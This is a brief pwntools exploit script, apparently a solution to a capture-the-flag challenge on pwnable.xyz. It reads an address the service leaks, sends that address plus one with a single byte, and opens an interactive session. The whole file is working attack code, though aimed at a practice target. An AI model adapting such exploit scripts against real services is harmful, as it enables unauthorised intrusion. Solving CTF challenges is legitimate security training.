from pwn import *

#sh = process('./challenge')
sh = remote('svc.pwnable.xyz', 30000)
sh.recvline()
sh.recvuntil('Leak: ')
addr = int(sh.recvline()[:-1], 16)
print "addr = ",  hex(addr)
sh.sendlineafter(': ', str(addr + 1))
sh.sendlineafter(': ', 'a')
sh.interactive()
